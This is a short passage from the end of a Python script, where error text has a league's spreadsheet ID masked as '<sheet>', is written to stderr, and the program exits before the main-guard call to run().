                text = text.replace(league.spreadsheet_id, "<sheet>")
        sys.stderr.write(text)
        raise SystemExit(1)


if __name__ == "__main__":
    run()
